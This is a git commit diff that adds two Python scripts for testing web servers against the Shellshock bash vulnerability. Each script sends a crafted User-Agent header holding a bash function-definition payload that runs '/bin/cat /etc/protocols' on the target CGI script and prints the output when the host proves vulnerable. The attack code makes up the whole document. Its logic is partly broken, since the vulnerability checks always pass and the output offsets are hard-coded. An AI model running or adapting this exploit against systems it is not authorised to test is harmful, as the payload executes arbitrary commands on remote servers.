6c8cb3ef46313c597a846a6f700d2ed7447a632c
William Fox <williamfox@gmail.com>
2014-10-01 09:47:46 -0700

    v2, launch script with cgi-bin URL, no error handling

---
+++ shellshock-v2.py
@@ -0,0 +1,43 @@
+__author__ = 'p' + 'f' + 'o' + 'x' + '[at]' + 'q' + 'u' + 'a' + 'l' + 'y' + 's' + '.' + 'com'
+from urlparse import urlparse
+import sys
+
+import requests
+from bs4 import BeautifulSoup
+
+## if not called with right params, exit
+if (len(sys.argv)<=1) or (len(sys.argv)>2):
+    print ('Usage: %s <URI>' % sys.argv[0])
+    print ('Example: %s http://10.10.35.163/cgi-bin/example-bash.sh' % sys.argv[0])
+    exit(0)
+
+## Dict of payloads
+'''
+1: list protocols from /etc/ on host
+'''
+user_agents = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
+           }
+
+o = urlparse(sys.argv[1])
+confirm = ' appears VULNERABLE!'
+allClear = ' does not appear VULNERABLE.'
+
+## for each payload, launch request to check for shellshock
+for each in user_agents:
+    query = o.scheme + '://' + o.netloc + o.path
+    results = requests.get(query, headers={'User-Agent':user_agents[each]})
+    soup = BeautifulSoup(results.text)
+    match = str(soup.body.p)
+    if (len(match)!= 0) or match != 'None':
+        if 'tcp' in match:
+            print ('Host: ' + query + confirm)
+            print ('Payload: ' + user_agents[each])
+            print(match[314:704])
+        elif 'root' in match:
+            print ('Host: ' + query + confirm)
+            print ('Payload: ' + user_agents[each])
+            print(match[3:35])
+        else:
+            print(match)
+    else:
+        print ('Host' + allClear)
--- shellshock.py
+++ shellshock.py
@@ -1,1 +1,25 @@
-__author__ = 'pfox'
+__author__ = 'p' + 'f' + 'o' + 'x' + '[at]' + 'q' + 'u' + 'a' + 'l' + 'y' + 's' + '.' + 'com'
+import requests
+from bs4 import BeautifulSoup
+import sys
+
+## if not called with right params, exit
+if (len(sys.argv)<=1):
+    print ('Usage: %s <host> <port> <vulnerableCGI> <attackHost/IP>' % sys.argv[0])
+    print ('Example: %s localhost 80 /cgi-bin/text.pl' % sys.argv[0])
+    exit(0)
+
+## Dict of payloads
+user_agents = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
+           }
+
+## for each payload, launch request to check for shellshock
+for each in user_agents:
+    results = requests.get('http://' + sys.argv[1] + ':' + sys.argv[2] + sys.argv[3], headers={'User-Agent':user_agents[each]})
+    soup = BeautifulSoup(results.text)
+    match = str(soup.body.p)
+    if (len(match)!= 0) or match != 'None' and 'tcp' in match:
+        print ('Host: ' + sys.argv[1] + ':' + sys.argv[2] + sys.argv[3] + ' appears vulnerable!  Response receivd:'),
+        print(match[314:700])
+    else:
+        print ('Host does not appear vulnerable')
